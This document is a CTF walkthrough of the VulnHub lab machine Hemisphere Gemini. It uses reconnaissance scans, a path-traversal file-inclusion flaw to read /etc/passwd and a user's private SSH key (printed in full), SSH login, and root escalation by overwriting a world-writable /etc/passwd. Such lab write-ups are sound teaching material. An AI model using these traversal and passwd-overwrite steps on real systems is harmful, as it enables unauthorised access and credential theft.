
# Hemisphere Gemini - CTF

Available on VulnHub: https://www.vulnhub.com/entry/hemisphere-gemini,596/


## Walkthrough

### IP Discovery

```
$ sudo netdiscover -r 192.168.1.0/16
```

```
Currently scanning: Finished!   |   Screen View: Unique Hosts

0 Captured ARP Req/Rep packets, from 0 hosts.   Total size: 0
_____________________________________________________________________________
 IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
xxx.xxx.x.x     xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
192.168.1.132   08:00:27:58:7b:4c      1      60  PCS Systemtechnik GmbH
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

### Port Scanning

```
$ nmap -AT4 -p- 192.168.1.132
```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-17 19:49 -03
Nmap scan report for 192.168.1.132
Host is up (0.00019s latency).
Not shown: 65530 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a3:38:0e:b6:a1:b8:49:b1:31:a0:43:3e:61:c3:26:37 (RSA)
|   256 fc:40:6c:0b:7b:f0:03:6e:2e:ef:2d:60:b5:96:01:b6 (ECDSA)
|_  256 90:ed:89:27:9d:65:ea:80:54:79:65:af:2c:d7:80:43 (ED25519)
80/tcp  open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Gemini Corp
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
Service Info: Host: GEMINI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -19m59s, deviation: 34m38s, median: 0s
|_nbstat: NetBIOS name: GEMINI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: gemini
|   NetBIOS computer name: GEMINI\x00
|   Domain name: \x00
|   FQDN: gemini
|_  System time: 2021-02-17T23:49:30+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-02-17T22:49:30
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.21 seconds
```

### Web Analysis

```
$ dirb http://192.168.1.132

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Feb 17 19:51:21 2021
URL_BASE: http://192.168.1.132/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.132/ ----
==> DIRECTORY: http://192.168.1.132/assets/                                                                          
==> DIRECTORY: http://192.168.1.132/images/                                                                          
+ http://192.168.1.132/index.html (CODE:200|SIZE:5062)                                                               
+ http://192.168.1.132/robots.txt (CODE:200|SIZE:20)                                                                 
+ http://192.168.1.132/server-status (CODE:403|SIZE:278)                                                             
                                                                                                                     
---- Entering directory: http://192.168.1.132/assets/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                     
---- Entering directory: http://192.168.1.132/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Wed Feb 17 19:51:26 2021
DOWNLOADED: 4612 - FOUND: 3
```

```
$ nikto -h http://192.168.1.132

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.132
+ Target Hostname:    192.168.1.132
+ Target Port:        80
+ Start Time:         2021-02-17 19:51:14 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.0.1".
+ Server may leak inodes via ETags, header found with file /, inode: 13c6, size: 5b36b716e7c16, mtime: gzip
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7915 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2021-02-17 19:52:33 (GMT-3) (79 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```
$ gobuster dir -t 50 -u http://192.168.1.132 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.js,/,.html

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.1.132
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,js,/,html,php
[+] Timeout:        10s
===============================================================
2021/02/17 19:50:59 Starting gobuster
===============================================================
/assets (Status: 301)
/index.html (Status: 200)
/contact.html (Status: 200)
/images (Status: 301)
/README.txt (Status: 200)
/generic.html (Status: 200)
/elements.html (Status: 200)
/robots.txt (Status: 200)
/Portal (Status: 301)
/server-status (Status: 403)
===============================================================
2021/02/17 19:56:19 Finished
===============================================================
```

### /Portal Analysis

In `/Portal` endpoint, we can find a Local File Injection (LFI) vulnerability.\
It happens when a `view` URL parameter is passed with a system path as value.
```
[ GET ] http://192.168.1.132/Portal/index.php?view=about-us.html
                                                   -------------
                                                   ^
                                                   |__ System Path
```

### Exploring LFI

We can use this vulnerability to see `/etc/passwd` file content.
```
$ wget http://192.168.1.132/Portal/index.php?view=../../../../../../../../../../../../../../../etc/passwd -O passwd.html

--2021-02-17 20:15:39--  http://192.168.1.132/Portal/index.php?view=../../../../../../../../../../../../../../../etc/passwd
Connecting to 192.168.1.132:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1865 (1.8K) [text/html]
Saving to: ‘passwd.html’

passwd.html                   100%[===============================================>]   1.82K  --.-KB/s    in 0s      

2021-02-17 20:15:39 (551 MB/s) - ‘passwd.html’ saved [1865/1865]

$ cat passwd.html

<html>
    <head>
	<link href="https://fonts.googleapis.com/css?family=IBM+Plex+Sans" rel="stylesheet"> 
	<link rel="stylesheet" type="text/css" href="style.css">
    </head>
    <body>
	<div class="menu">
	    <a href="index.php">Pagina principal</a>
	    <a href="index.php?view=about-us.html">Sobre nosotros</a>
	    <a href="index.php?view=contact-us.html">Contacto</a>
	</div>
<p>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
william:x:1000:1000:william,,,:/home/william:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ftp:x:106:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
</p>    </body>
</html>
```

User found: **william**
```
william:x:1000:1000:william,,,:/home/william:/bin/bash
```

Now I attempted to retrieve `william`'s SSH key, and we I got it.
```
$ wget http://192.168.1.132/Portal/index.php?view=../../../../../../../../../../../../../../../home/william/.ssh/id_rsa -O id_rsa.html

--2021-02-17 20:16:44--  http://192.168.1.132/Portal/index.php?view=../../../../../../../../../../../../../../../home/william/.ssh/id_rsa
Connecting to 192.168.1.132:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2232 (2.2K) [text/html]
Saving to: ‘id_rsa.html’

id_rsa.html                   100%[===============================================>]   2.18K  --.-KB/s    in 0s      

2021-02-17 20:16:44 (82.2 MB/s) - ‘id_rsa.html’ saved [2232/2232]

$ cat id_rsa.html

<html>
    <head>
	<link href="https://fonts.googleapis.com/css?family=IBM+Plex+Sans" rel="stylesheet"> 
	<link rel="stylesheet" type="text/css" href="style.css">
    </head>
    <body>
	<div class="menu">
	    <a href="index.php">Pagina principal</a>
	    <a href="index.php?view=about-us.html">Sobre nosotros</a>
	    <a href="index.php?view=contact-us.html">Contacto</a>
	</div>
<p>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEApEB973BhwsqufjKoEz/SQlZ0uCWUfbH1ffZcqTpwQZviXN/FMpcG
izyJCpiUOy9gt7bbc6P17bBDDZpHyWzyZIbf8DmtPbHlRhzuHPEI2FZ7+MCRYjBRd/txVI
IpJyoGwp4ADg5/nl6ZJnl4MdntjRDj9Fnrm2gmd+LrueXyvWm+4F72T/e65FkgkwwLWMUQ
pwqepO3lgBEzWRFoHUh+hy2icOYZkrmNoiN/D92cLpEU4reZeugPpTtfwIR7xH2ZDknYB/
6t4HV0YmDEYtIWlNbgYCKvymvsdN7SfKSbmYXKHGhWmPYT0/snTmJH27ULN2IsgQu2JWRL
Zx0/YrcCDwAAA8hDt+QAQ7fkAAAAAAdzc2gtcnNhAAABAQCkQH3vcGHCyq5+MqgTP9JCVn
S4JZR9sfV99lypOnBBm+Jc38UylwaLPIkKmJQ7L2C3tttzo/XtsEMNmkfJbPJkht/wOa09
seVGHO4c8QjYVnv4wJFiMFF3+3FUgiknKgbCngAODn+eXpkmeXgx2e2NEOP0WeubaCZ34u
u55fK9ab7gXvZP97rkWSCTDAtYxRCnCp6k7eWAETNZEWgdSH6HLaJw5hmSuY2iI38P3Zwu
kRTit5l66A+lO1/AhHvEfZkOSdgH/q3gdXRiYMRi0haU1uBgIq/Ka+x03tJ8pJuZhcocaF
aY9hPT+ydOYkfbtQs3YiyBC7YlZEtnHT9itwIPAAAAAwEAAQAAAQEAoVUHXcxQ+fgC9Mnk
9SNW7vnko4umEuBddWArG73ezVLEQN064LofH1xSbyn3Tzr2EP13CFsgEFt1QUMtB9gPLl
acV2UPmO3Hedqot5y5R2WLV4YuRveWzfcYFh3TNji9cyOmgigTigb4/yWIvc6E2m6guT4p
gfgG8PLe/zWx/ADzKbNqTbCF99rivzWaaBB2jC9ff1uIWOQPcR0Uh1Z2o8ADj763u0nLNS
3tJ1l84ANqqYMlobG3+AJKrBracIb/FYOgd/7erH1EEgVZyaexF6/z4uiVAmpEPrtMTd30
B2gE9ePbOqz68uPbMqGGOtq2FzH09wXkn25rndwmiuX0YQAAAIBv5zHpuI+WQUrPqSpTAw
Ma0s6wJ2MjdgnZKEtebYCS6sgTmX8+nvxmM003O9qukvcM7uIr4JbzEX+i+HpamSfTsSkN
G9AjHsixOTHmpvRy5+xSnMV9h1u4IRsJRoZsX8SR7e9ubkK5JaQCZk/CPxC5+ftfmHcWEk
hZiRdP2hFeHQAAAIEA0NdDWCN1smOZsZzEsJQGkv23+7am1ZS9yPRi5+xV8m8nOhDYDEYm
IZgIhrYX76wAxnXq/CA6AJ58q5EOcKOfWScu2Hv7h1+tPkFMgB5sjZAQQ2vJl+opLnuXpr
Doq8UlJJzxXWN0U6QmMQeE1lOkOMw2OfTQrHmXMZj8Fq+5Ck0AAACBAMlXngMOGO74Rgxw
NWeJIIzqBur3FAxCQkgn1U8A4P5NGRHrMGX91+jzFSeTOD0y8f/zDTwHT6QOpFmticZMh1
UW7bvAIMaJEfThG/uKt8xPXLPRcezds9WHYcGj5IZ8BuD39gnWlfJkPG6nuR+G0jjW9gEd
fKRRpBxhj78f6LPLAAAAC3Jvb3RAZ2VtaW5pAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
</p>    </body>
</html>
```

### SSH Access

I create a file called `william_id_rsa.key` with the retrieved key only.
```
$ cat william_id_rsa.key

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEApEB973BhwsqufjKoEz/SQlZ0uCWUfbH1ffZcqTpwQZviXN/FMpcG
izyJCpiUOy9gt7bbc6P17bBDDZpHyWzyZIbf8DmtPbHlRhzuHPEI2FZ7+MCRYjBRd/txVI
IpJyoGwp4ADg5/nl6ZJnl4MdntjRDj9Fnrm2gmd+LrueXyvWm+4F72T/e65FkgkwwLWMUQ
pwqepO3lgBEzWRFoHUh+hy2icOYZkrmNoiN/D92cLpEU4reZeugPpTtfwIR7xH2ZDknYB/
6t4HV0YmDEYtIWlNbgYCKvymvsdN7SfKSbmYXKHGhWmPYT0/snTmJH27ULN2IsgQu2JWRL
Zx0/YrcCDwAAA8hDt+QAQ7fkAAAAAAdzc2gtcnNhAAABAQCkQH3vcGHCyq5+MqgTP9JCVn
S4JZR9sfV99lypOnBBm+Jc38UylwaLPIkKmJQ7L2C3tttzo/XtsEMNmkfJbPJkht/wOa09
seVGHO4c8QjYVnv4wJFiMFF3+3FUgiknKgbCngAODn+eXpkmeXgx2e2NEOP0WeubaCZ34u
u55fK9ab7gXvZP97rkWSCTDAtYxRCnCp6k7eWAETNZEWgdSH6HLaJw5hmSuY2iI38P3Zwu
kRTit5l66A+lO1/AhHvEfZkOSdgH/q3gdXRiYMRi0haU1uBgIq/Ka+x03tJ8pJuZhcocaF
aY9hPT+ydOYkfbtQs3YiyBC7YlZEtnHT9itwIPAAAAAwEAAQAAAQEAoVUHXcxQ+fgC9Mnk
9SNW7vnko4umEuBddWArG73ezVLEQN064LofH1xSbyn3Tzr2EP13CFsgEFt1QUMtB9gPLl
acV2UPmO3Hedqot5y5R2WLV4YuRveWzfcYFh3TNji9cyOmgigTigb4/yWIvc6E2m6guT4p
gfgG8PLe/zWx/ADzKbNqTbCF99rivzWaaBB2jC9ff1uIWOQPcR0Uh1Z2o8ADj763u0nLNS
3tJ1l84ANqqYMlobG3+AJKrBracIb/FYOgd/7erH1EEgVZyaexF6/z4uiVAmpEPrtMTd30
B2gE9ePbOqz68uPbMqGGOtq2FzH09wXkn25rndwmiuX0YQAAAIBv5zHpuI+WQUrPqSpTAw
Ma0s6wJ2MjdgnZKEtebYCS6sgTmX8+nvxmM003O9qukvcM7uIr4JbzEX+i+HpamSfTsSkN
G9AjHsixOTHmpvRy5+xSnMV9h1u4IRsJRoZsX8SR7e9ubkK5JaQCZk/CPxC5+ftfmHcWEk
hZiRdP2hFeHQAAAIEA0NdDWCN1smOZsZzEsJQGkv23+7am1ZS9yPRi5+xV8m8nOhDYDEYm
IZgIhrYX76wAxnXq/CA6AJ58q5EOcKOfWScu2Hv7h1+tPkFMgB5sjZAQQ2vJl+opLnuXpr
Doq8UlJJzxXWN0U6QmMQeE1lOkOMw2OfTQrHmXMZj8Fq+5Ck0AAACBAMlXngMOGO74Rgxw
NWeJIIzqBur3FAxCQkgn1U8A4P5NGRHrMGX91+jzFSeTOD0y8f/zDTwHT6QOpFmticZMh1
UW7bvAIMaJEfThG/uKt8xPXLPRcezds9WHYcGj5IZ8BuD39gnWlfJkPG6nuR+G0jjW9gEd
fKRRpBxhj78f6LPLAAAAC3Jvb3RAZ2VtaW5pAQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----
```

When I attempt to login via SSH, I got this error
```
$ ssh william@192.168.1.132 -i william_id_rsa.key

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'william_id_rsa.key' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "william_id_rsa.key": bad permissions
william@192.168.1.132's password:
```

As the error said, we just need to change the permission of `william_id_rsa.key` file.
```
$ ls -lah william_id_rsa.key
-rw-r--r-- 1 burton burton 1.8K Feb 17 20:17 william_id_rsa.key

$ chmod 600 william_id_rsa.key 

$ ls -lah william_id_rsa.key
-rw------- 1 burton burton 1.8K Feb 17 20:17 william_id_rsa.key
```

Now we can proceed with SSH login
```
$ ssh william@192.168.1.132 -i william_id_rsa.key

Linux gemini 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64


                    _-o#&&*''''?d:>b\_
                _o/"`''  '',, dMF9MMMMMHo_
             .o&#'        `"MbHMMMMMMMMMMMHo.
           .o"" '         vodM*$&&HMMMMMMMMMM?.
          ,'              $M&ood,~'`(&##MMMMMMH\
         /               ,MMMMMMM#b?#bobMMMMHMMML
        &              ?MMMMMMMMMMMMMMMMM7MMM$R*Hk
       ?$.            :MMMMMMMMMMMMMMMMMMM/HMMM|`*L
      |               |MMMMMMMMMMMMMMMMMMMMbMH'   T,
      $H#:            `*MMMMMMMMMMMMMMMMMMMMb#}'  `?
      ]MMH#             ""*""""*#MMMMMMMMMMMMM'    -
      MMMMMb_                   |MMMMMMMMMMMP'     :
      HMMMMMMMHo                 `MMMMMMMMMT       .
      ?MMMMMMMMP                  9MMMMMMMM}       -
      -?MMMMMMM                  |MMMMMMMMM?,d-    '
       :|MMMMMM-                 `MMMMMMMT .M|.   :
        .9MMM[                    &MMMMM*' `'    .
         :9MMk                    `MMM#"        -
           &M}                     `          .-
            `&.                             .
              `~,   .                     ./
                  . _                  .-
                    '`--._,#######=""'

██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗
██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝
██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗  
██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  
╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗
 ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝

william@gemini:~$ id
uid=1000(william) gid=1000(william) grupos=1000(william),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

### Flag #1 - User

```
william@gemini:~$ cat user.txt
       _________
      (=========)
      |=========|
      |====_====|
      |== / \ ==|
      |= / _ \ =|
   _  |=| ( ) |=|
  /=\ |=|     |=| /=\
  |=| |=|     |=| |=|
  |=| |=|  _  |=| |=|
  |=| |=| | | |=| |=|
  |=| |=| | | |=| |=|
  |=| |=| | | |=| |=|
  |=| |/  | |  \| |=|
  |=|/    | |    \|=|
  |=/     |_|     \=|
  |(_______________)|
  |=| |_|__|__|_| |=|
  |=|   ( ) ( )   |=|
 /===\           /===\
|||||||         |||||||
-------         -------
 (~~~)           (~~~)

user_flag==> srLbBhLRK7nBdZAesnxyeWaMV
```

### Privilege Escalation

As we could read the `/etc/passwd` file, I took a look in its permissions and...
```
william@gemini:~$ ls -lah /etc/passwd
-rwsrwsrwx 1 root root 1,5K nov  6 15:09 /etc/passwd
```

So we are able to write in `/etc/passwd` file.\
My choice was to overwrite root password.
```
william@gemini:~$ openssl passwd -1 -salt root root
$1$root$9gr5KxwuEdiI80GtIzd.U0

william@gemini:~$ cat /etc/passwd
root:$1$root$9gr5KxwuEdiI80GtIzd.U0:0:0:root:/root:/bin/bash
     ------------------------------
     ^

william@gemini:~$ su root
Contraseña: root

root@gemini:/home/william# id
uid=0(root) gid=0(root) grupos=0(root)
```

### Flag #2 - Root

```
root@gemini:~# cat root.txt

 /\/\/\                            /  \
| \  / |                         /      \
|  \/  |                       /          \
|  /\  |----------------------|     /\     |
| /  \ |                      |    /  \    |
|/    \|                      |   /    \   |
|\    /|                      |  | (  ) |  |
| \  / |                      |  | (  ) |  |
|  \/  |                 /\   |  |      |  |   /\
|  /\  |                /  \  |  |      |  |  /  \
| /  \ |               |----| |  |      |  | |----|
|/    \|---------------|    | | /|   .  |\ | |    |
|\    /|               |    | /  |   .  |  \ |    |
| \  / |               |    /    |   .  |    \    |
|  \/  |               |  /      |   .  |      \  |
|  /\  |---------------|/        |   .  |        \|
| /  \ |              /          |   .  |          \
|/    \|              (          |      |           )
|/\/\/\|               |    | |--|      |--| |    |
------------------------/  \-----/  \/  \-----/  \--------
                        \\//     \\//\\//     \\//
                         \/       \/  \/       \/

root_flag==> vD1JA8mze74XzkmzOA21R4sjZ
```
